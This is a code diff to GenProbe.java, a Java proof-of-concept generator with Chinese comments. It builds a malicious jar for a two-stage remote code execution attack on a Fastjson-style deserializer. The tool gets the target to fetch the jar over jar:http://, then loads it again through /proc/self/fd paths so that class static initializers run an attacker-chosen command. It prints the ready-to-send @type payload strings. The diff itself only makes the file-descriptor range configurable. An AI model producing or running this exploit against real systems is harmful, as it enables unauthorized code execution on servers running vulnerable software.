@@ -9,15 +9,17 @@ import java.util.jar.*;
  * FD 模式原理:
  *   第一阶段 : 用 jar:http://<ip>:<port>/probe!/foo/Exception 诱使靶机下载 probe.jar
  *             (HTTP GET 副作用，把 jar 以某个 fd 形式挂在靶机 /proc/self/fd 下)
- *   FD 阶段  : 枚举 jar:file:.proc.self.fd.3 ~ .256，定位已下载的 jar，
+ *   FD 阶段  : 枚举 jar:file:.proc.self.fd.3 ~ .maxFd，定位已下载的 jar，
  *             加载其中 fdN.Exception (带 @JSONType + <clinit> 执行命令) 触发 RCE
  *   jar:file: 是 JVM 原生支持的嵌套 jar URL，且指向本地已打开的 fd，
  *   因此 LaunchedURLClassLoader.getResourceAsStream 能成功 => @JSONType 信任路径打通
+ *
+ * 用法: java -cp asm-9.6.jar GenProbe <lhost> <lport> <cmd> <mode> <tag> <maxFd>
+ *   maxFd 默认 2048, 必须与 exp.py 的 --max-fd 保持一致
  */
 
 public class GenProbe {
     private static final int MIN_FD = 3;
-    private static final int MAX_FD = 2048;
 
     private static String cleanTag(String tag) {
         if (tag == null || tag.isEmpty()) {
@@ -86,6 +88,7 @@ public class GenProbe {
         String cmd = args.length > 2 ? args[2] : "open -a Calculator";
         String mode = args.length > 3 ? args[3] : "fd";
         String tag = cleanTag(args.length > 4 ? args[4] : "");
+        int maxFd = args.length > 5 ? Integer.parseInt(args[5]) : 2048;
 
         String payloadHost = toPayloadHost(lhost);
         String classSuffix = tag.isEmpty() ? "" : tag;
@@ -111,7 +114,7 @@ public class GenProbe {
             jos.write(makeClass(firstInternal, cmd, false, false));
             jos.closeEntry();
 
-            for (int fd = MIN_FD; fd <= MAX_FD; fd++) {
+            for (int fd = MIN_FD; fd <= maxFd; fd++) {
                 String entry = "fd" + fd + "/" + fdClass + ".class";
                 String internal = "jar:file:/proc/self/fd/" + fd + "!/fd" + fd + "/" + fdClass;
                 jos.putNextEntry(new JarEntry(entry));
@@ -121,8 +124,8 @@ public class GenProbe {
         }
         Files.copy(jarPath, Paths.get("poc/www/" + probeName), StandardCopyOption.REPLACE_EXISTING);
 
-        System.out.println("[+] poc/probe.jar & poc/www/" + probeName + " generated");
+        System.out.println("[+] poc/probe.jar & poc/www/" + probeName + " generated (fd 3~" + maxFd + ")");
         System.out.println("[+] First stage: {\"@type\":\"jar:http:.." + payloadHost + ":" + lport + "." + probeName + "!.foo." + firstClass + "\"}");
-        System.out.println("[+] FD stages: jar:file:.proc.self.fd.3!.fd3." + fdClass + " ... jar:file:.proc.self.fd." + MAX_FD + "!.fd" + MAX_FD + "." + fdClass);
+        System.out.println("[+] FD stages: jar:file:.proc.self.fd.3!.fd3." + fdClass + " ... jar:file:.proc.self.fd." + maxFd + "!.fd" + maxFd + "." + fdClass);
     }
 }
